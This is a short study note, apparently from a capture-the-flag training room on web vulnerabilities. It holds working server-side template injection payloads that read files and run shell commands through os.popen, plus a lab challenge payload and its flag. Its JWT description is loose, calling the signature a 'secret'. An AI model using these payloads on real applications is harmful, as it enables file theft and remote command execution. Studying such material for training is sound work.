6 july 2021 - Tuesday


#	ZTH: Obscure Web Vulns

This room contains walkthrough on different vulnerabilities!

The vulnerabilities that will be discussed are:

*	SSTI
*	CSRF
*	JWT
*	XXE




##	server side template injection

*	payload to read files
	```
{{ ''.__class__.__mro__[2].__subclasses__()[40]()(<file>).read()}}
	```

*	payload to execute commands
	```
{{config.__class__.__init__.__globals__['os'].popen(<command>).read()}}
	```

*	tool:

`Tplmap` is tool for automated testing of SSTI.

###	challenge

payload
```
{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}
```

flag
```
cooctus
```




##	CSRF


*	tool:

`xsrfprobe` can be used for automated testing of CSRF vulnerability.
 
##	JWT 

JWT is **Json Web Token** and is NoT a vulnerability.
it's method involved in authentication.

*	structure:
	```
header.payload.secret
	```
	*	secret is only known to server.

*	everything is base64 encoded.

*	`header` structure (example)
	```
{"typ":"JWT","alg":"RS256"}
	```


